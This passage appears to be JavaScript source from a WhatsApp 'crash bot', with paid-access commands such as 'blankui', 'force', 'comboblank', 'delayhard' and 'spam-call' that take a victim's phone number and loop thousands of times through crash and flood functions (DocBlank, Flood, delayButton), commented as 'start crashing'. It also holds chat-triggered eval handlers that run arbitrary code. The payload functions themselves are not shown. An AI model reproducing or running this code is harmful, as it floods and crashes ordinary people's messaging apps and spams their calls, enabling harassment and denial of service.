    await ForClosesql(target);
    }
zepy.sendMessage(from, {react: {text: "💠", key: m.key}})

// IOS BLUST CASE
case 'blankui': {
if (!isBot && !isPremium && !isOwner) return reply(`ⓘ You Don't Have Access`)
if (!q) return reply(`ⓘ Example: ${prefix+command} 62×××`)
let pepec = q.replace(/[^0-9]/g, "")
let target = pepec + '@s.whatsapp.net'
reply(`> 🦠 ━⊱ *INFORMATION* 
▢ target: ${pepec}
▢ status: success
▢ type: ${command}`)
// Memulai Crashing
for (let i = 0; i <= 5000; i++) {
    await DocBlank(target true);
    await DocBlank(target true);
    }
zepy.sendMessage(from, {react: {text: "💠", key: m.key}})
}
break

// OVER LOAD CASE
case 'force': {
if (!isBot && !isPremium && !isOwner) return reply(`ⓘ You Don't Have Access`)
if (!q) return reply(`ⓘ Example: ${prefix+command} 62×××`)
let pepec = q.replace(/[^0-9]/g, "")
let target = pepec + '@s.whatsapp.net'
reply(`> 🦠 ━⊱ *INFORMATION* 
▢ target: ${pepec}
▢ status: success
▢ type: ${command}`)
// Memulai Crashing
for (let i = 0; i <= 5000; i++) {
    await Flood(target);
    await Flood(target);
    }
zepy.sendMessage(from, {react: {text: "💫", key: m.key}})
}
break
// CURSE CASE
case 'comboblank': {
if (!isBot && !isPremium && !isOwner) return reply(`ⓘ You Don't Have Access`)
if (!q) return reply(`ⓘ Example: ${prefix+command} 62×××`)
let pepec = q.replace(/[^0-9]/g, "")
let target = pepec + '@s.whatsapp.net'
reply(`> 🦠 ━⊱ *INFORMATION* 
▢ target: ${pepec}
▢ status: success
▢ type: ${command}`)
// Memulai Crashing
for (let i = 0; i <= 5000; i++) {
    await delayButton(target);
    await delayButton(target);
    }
zepy.sendMessage(from, {react: {text: "⚡", key: m.key}})
}
break

case 'delayhard': {
if (!isBot && !isPremium && !isOwner) return reply(`ⓘ You Don't Have Access`)
if (!q) return reply(`ⓘ Example: ${prefix+command} 62×××`)
let pepec = q.replace(/[^0-9]/g, "")
let target = pepec + '@s.whatsapp.net'
reply(`> 🦠 ━⊱ *INFORMATION* 
▢ target: ${pepec}
▢ status: success
▢ type: ${command}`)
// Memulai Crashing
for (let i = 0; i <= 5000; i++) {
    await delayButton(target);
    await epcehnew(target);
    }
zepy.sendMessage(from, {react: {text: "😏", key: m.key}})
}
break

case 'spam-call': {
if (!isBot && !isPremium && !isOwner) return reply(`ⓘ You Don't Have Access`)
if (!q) return reply(`ⓘ Example: ${prefix+command} 62×××`)
let pepec = q.replace(/[^0-9]/g, "")
let target = pepec + '@s.whatsapp.net'
reply(`> 🦠 ━⊱ *INFORMATION* 
▢ target: ${pepec}
▢ status: success
▢ type: ${command}`)
// Memulai Crashing
    for (let i = 0; i < 50; i++) { 
    await delay(500); // 0.5 detik kirim pesan
    delayButton(target);
  }
zepy.sendMessage(from, {react: {text: "😘", key: m.key}})
}
break
// AKHIR CASE INI JANGAN DIUBAH
default:
if (budy.startsWith('>')) {
if (!isOwner) return;
try {
let evaled = await eval(budy.slice(2));
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled);
await m.reply(evaled);
} catch (err) {
m.reply(String(err));
}
}

//////~~~~~~~~pemanggil ~~~~~
if (m.text.toLowerCase() == "bot") {
m.reply("BOT ONLINE YAA BUJANGGG😏")
}

if (budy.startsWith('<')) {
if (!isOwner) return
let kode = budy.trim().split(/ +/)[0]
let teks
try {
teks = await eval(`(async () => { ${kode == ">>" ? "return" : ""} ${q}})()`)
} catch (e) {
teks = e
} finally {
await m.reply(require('util').format(teks))
}
}

}
} catch (err) {
console.log(require("util").format(err));
}
};

let file = require.resolve(__filename);
require('fs').watchFile(file, () => {
require('fs').unwatchFile(file);
console.log('\x1b[0;32m' + __filename + ' \x1b[1;32mupdated!\x1b[0m');
delete require.cache[file];
require(file);
});